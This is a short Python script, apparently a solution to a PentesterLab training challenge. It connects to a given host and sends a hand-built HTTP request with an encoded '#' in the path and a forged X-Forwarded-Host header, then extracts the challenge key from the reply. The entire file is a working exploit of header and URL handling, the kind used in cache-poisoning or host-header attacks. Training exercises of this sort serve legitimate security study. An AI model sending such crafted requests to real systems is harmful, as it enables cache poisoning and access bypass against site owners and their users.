#!/usr/bin/python3
import re
import socket
import sys

GREEN = "\033[32m"
RED = "\033[91m"
RESET = "\033[0m"

if len(sys.argv) != 2:
    print(f"Usage:\n\tpython3 {sys.argv[0]} <HOSTNAME>")
    sys.exit(1)

hostname = sys.argv[1]
port = 80

if "http" in hostname:
    print(f"{RED}[-] Required a hostname, not a URL.{RESET}")
    sys.exit(1)

socket_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_.connect((hostname, port))
request = f"GET /pentesterlab%23pentesterlab  HTTP/1.1\r\nHost: {hostname}\r\nX-Forwarded-Host: pentesterlab.com\r\n\r\n".encode()
socket_.sendall(request)
response = socket_.recv(1024).decode()
socket_.close()
key = re.search(r"[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*-[\da-f]*", response).group()
print(f"[+] The key for this challenge is {GREEN}{key}{RESET}")
